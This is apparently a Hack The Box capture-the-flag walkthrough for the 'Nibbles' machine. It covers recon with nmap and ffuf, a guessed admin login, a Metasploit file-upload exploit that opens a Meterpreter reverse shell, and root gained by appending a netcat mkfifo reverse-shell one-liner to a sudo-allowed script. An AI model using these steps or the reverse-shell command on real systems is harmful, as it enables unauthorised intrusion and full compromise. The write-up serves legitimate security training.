# Nibbles-HTB
Nibbles is a Linux machine that is rated as easy. You going to see how to gain a shell with Metasploit.

# Recon
I started by runing nmap scan on the machine.
```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -sV 10.10.10.75
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-28 21:45 EDT
Nmap scan report for 10.10.10.75
Host is up (0.037s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.51 seconds
```
If you open the Website and viewed the page source you will find this:
```html
<b>Hello world!</b>

...

<!-- /nibbleblog/ directory. Nothing interesting here! -->
```
If we go to http://10.10.10.75/nibbleblog/ we will find this:

![image1](https://github.com/electronicbots/HackTheBox/blob/master/Machines/Nibbles/images/1.png)

Also make note of this ```Powered by Nibbleblog```
## ffuf
I will be using ffuf to fuze web directories.
```
┌──(kali㉿kali)-[~/Desktop]
└─$ ./ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.10.75/nibbleblog/FUZZ.php       

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.75/nibbleblog/FUZZ.php
 :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

index                   [Status: 200, Size: 2985, Words: 116, Lines: 61]
sitemap                 [Status: 200, Size: 402, Words: 33, Lines: 11]
feed                    [Status: 200, Size: 302, Words: 8, Lines: 8]
admin                   [Status: 200, Size: 1401, Words: 79, Lines: 27]
install                 [Status: 200, Size: 78, Words: 11, Lines: 1]
update                  [Status: 200, Size: 1621, Words: 103, Lines: 88]
```
And we found a loging page at ```admin.php```:

![image2](https://github.com/electronicbots/HackTheBox/blob/master/Machines/Nibbles/images/2.png)

So I tried many things and nothing worked for me. I checked the community posts and found out that I need to guess it :(, This box made me realized how bad I am at guessing XD.

After some minutes I was able to get the password and it is ```admin:nibbles```. And we are in :)

![image3](https://github.com/electronicbots/HackTheBox/blob/master/Machines/Nibbles/images/3.png)

# User Flag
We will use ```multi/http/nibbleblog_file_upload``` to get a shell on the machine.
```
msf5 > use multi/http/nibbleblog_file_upload
msf5 exploit(multi/http/nibbleblog_file_upload) > options 

Module options (exploit/multi/http/nibbleblog_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   nibbles          yes       The password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.75      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /nibbleblog/     yes       The base path to the web application
   USERNAME   admin            yes       The username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.28      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Nibbleblog 4.0.3
```
And it worked
```
msf5 exploit(multi/http/nibbleblog_file_upload) > exploit 

[*] Started reverse TCP handler on 10.10.14.28:4444 
[*] Sending stage (38288 bytes) to 10.10.10.75
[*] Meterpreter session 1 opened (10.10.14.28:4444 -> 10.10.10.75:42342) at 2020-08-28 22:06:50 -0400
[+] Deleted image.php



meterpreter >
```

Let's deploy a shell now and upgrade it:
```
meterpreter > shell 
Process 1497 created.
Channel 0 created.
python3 -c 'import pty; pty.spawn("/bin/bash")'
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$
nibbler@Nibbles:/$ id
id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```
Get the User Flag:
```
nibbler@Nibbles:/home/nibbler$ cat user.txt
cat user.txt
b02ff32...ed21152c8d8
```

# Root Flag
By running ```sudo -l``` we can see that we can run ```/home/nibbler/personal/stuff/monitor.sh``` with sudo.
```
nibbler@Nibbles:/home/nibbler$ sudo -l
sudo -l
sudo: unable to resolve host Nibbles: Connection timed out
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
So let's unzip the file first:
```
nibbler@Nibbles:/home/nibbler$ ls
ls
personal.zip  user.txt
nibbler@Nibbles:/home/nibbler$ unzip personal.zip
unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh  
nibbler@Nibbles:/home/nibbler$ ls
ls
personal  personal.zip  user.txt
```
So we can add our reverse command to the file and run it with sudo:
```
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your_ip_address> 5555 > /tmp/f" >> monitor.sh
```
Now run it with sudo and get your root shell :)
```
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nlvp 5555
listening on [any] 5555 ...
connect to [10.10.14.28] from (UNKNOWN) [10.10.10.75] 49078
# id
uid=0(root) gid=0(root) groups=0(root)
```
Get Root Flag:
```
# cat root.txt
b6d745c0d...1efc898ef88c
```

Thank you for reading, and you can find me here on twitter: https://twitter.com/electronicbots
